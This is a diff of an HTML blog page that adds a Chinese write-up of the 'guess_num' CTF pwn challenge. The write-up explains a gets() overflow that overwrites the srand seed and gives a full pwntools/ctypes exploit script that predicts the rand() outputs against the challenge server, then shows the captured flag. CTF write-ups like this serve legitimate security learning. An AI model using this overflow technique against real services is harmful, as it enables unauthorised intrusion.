@@ -510,6 +510,62 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
             </figure>
 
 <p>得到flag:cyberpeace{d35672c5e758a40ea0c05f6dbbe77015}</p>
+<h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>老样子 查保护 看位数</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H1dcd4e82cae14e17b2130dbecfbab142m.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H1dcd4e82cae14e17b2130dbecfbab142m.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>保护开得很全… 先跑一下 先是输入名字 然后输出自己猜的数…果断GG掉了…那载入IDA吧…</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/H9f1db03916794d03b4ed742e914b8381S.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H9f1db03916794d03b4ed742e914b8381S.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>主函数很耿直 几乎没有跳转 跟进sub_C3E看下 发现就是cat flag 那么主要就是主函数的执行了</p>
+<blockquote>
+<p>刚开始菜鸡很是头疼 这个随机数怎么搞定 后来了解了下rand函数的具体原理</p>
+<p>rand函数是伪随机函数 他每个”种子”对应一个固定的随机值 所以在使用rand函数之前会使用srand来随机生成一个种子</p>
+</blockquote>
+<p>仔细一看 哦吼..大胆的作者敢用gets读入..八成是溢出了..再配合srand函数的原理 很容易确定思路</p>
+<p>先是利用溢出 覆盖掉种子的值 从而达到控制随机数的目的 那么就开始写脚本吧 首先确定偏移地址</p>
+<p>双击v9进入栈图 我们的目的是覆盖seed的值</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/Hee09e00f48d64a8da1cf875c501952fbU.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hee09e00f48d64a8da1cf875c501952fbU.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>可以简单计算出偏移量是20 那么写出脚本即可</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
+sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"53030"</span><span class="token punctuation">)</span>
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./guess"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#print(elf.libc)</span>
+libc<span class="token operator">=</span>cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span>
+payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"name:"</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+      num<span class="token operator">=</span>str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span>
+      sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'number:'</span><span class="token punctuation">)</span>
+      sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>num<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<blockquote>
+<p>这个脚本的关键就是如何在python中使用c的函数 我选择的解决方法是 使用ctypes库 </p>
+<p>这个库可以方便我们直接在程序中使用C的函数 但是我们首先要确定libc共享库的版本号 这里我是用的是ldd指令进行的查询<br>如果懒的话也可以通过在程序中使用elf.libc来获取</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/Hbc247d86009a4a3cac2312c5f56843149.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hbc247d86009a4a3cac2312c5f56843149.png" alt title class></a>
+                <p></p>
+            </figure>
+</blockquote>
+<p>运行脚本即可</p>
+<figure class="image-box">
+                <a rel="攻防世界PWN新手练习区WP" href="https://ae01.alicdn.com/kf/Hb3290098e42744f7ae81df295cbd19ccc.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hb3290098e42744f7ae81df295cbd19ccc.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>得到flag:cyberpeace{de6b4ebe0aab9472c1dda38729fc76ef}</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -535,7 +591,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2019-10-09T11:39:26.537Z" itemprop="dateUpdated">2019-10-09 19:39:26</time>
+    最后更新时间：<time datetime="2019-10-09T13:27:51.928Z" itemprop="dateUpdated">2019-10-09 21:27:51</time>
 </span><br>
 
 
@@ -617,7 +673,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CGfsb"><span class="post-toc-number">1.</span> <span class="post-toc-text">CGfsb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#when-did-you-born"><span class="post-toc-number">2.</span> <span class="post-toc-text">when_did_you_born</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hello-pwn"><span class="post-toc-number">3.</span> <span class="post-toc-text">hello_pwn</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level0"><span class="post-toc-number">4.</span> <span class="post-toc-text">level0</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-2"><span class="post-toc-number">5.</span> <span class="post-toc-text">level 2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#string"><span class="post-toc-number">6.</span> <span class="post-toc-text">string</span></a></li></ol>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#CGfsb"><span class="post-toc-number">1.</span> <span class="post-toc-text">CGfsb</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#when-did-you-born"><span class="post-toc-number">2.</span> <span class="post-toc-text">when_did_you_born</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#hello-pwn"><span class="post-toc-number">3.</span> <span class="post-toc-text">hello_pwn</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level0"><span class="post-toc-number">4.</span> <span class="post-toc-text">level0</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#level-2"><span class="post-toc-number">5.</span> <span class="post-toc-text">level 2</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#string"><span class="post-toc-number">6.</span> <span class="post-toc-text">string</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#guess-num"><span class="post-toc-number">7.</span> <span class="post-toc-text">guess_num</span></a></li></ol>
             </nav>
             <div class="toc-bar"><div>
         </div></div></aside>
